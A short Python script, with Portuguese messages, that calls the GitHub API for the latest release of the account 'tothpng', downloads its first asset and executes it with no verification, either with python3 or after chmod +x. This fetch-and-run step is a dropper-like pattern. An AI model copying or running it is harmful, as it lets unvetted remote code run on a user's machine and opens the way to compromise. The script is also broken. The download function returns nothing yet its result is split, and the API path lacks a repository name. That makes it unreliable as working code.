import requests as req
import os


def download_latest_release(repo_owner, download_path='.'):
    response = req.get(
        f'https://api.github.com/repos/{repo_owner}/releases/latest')
    if response.status_code == 200:
        info = response.json()
        assets = info.get('assets')
        if assets:
            asset = assets[0]
            file_name = asset.get('name')
            file_url = asset.get('browser_download_url')
            if file_url:
                file_path = os.path.join(download_path, file_name)
                with open(file_path, 'wb') as f:
                    f.write(req.get(file_url).content)
                print(f'Download completo! Arquivo salvo como: {file_path}')
            else:
                print('Não foram encontrados arquivos para download no último lançamento.')
        else:
            print('Não foram encontrados ativos no último lançamento.')
    else:
        print('Erro ao obter informações sobre o último lançamento.')


repo_owner = 'tothpng'
file_name = download_latest_release(repo_owner)
if file_name.split('.')[2] == 'pyc':
    os.system(f'python3 {file_name}')
else:
    os.system(f'chmod +x {file_name}')
    os.system(f'{file_name}')

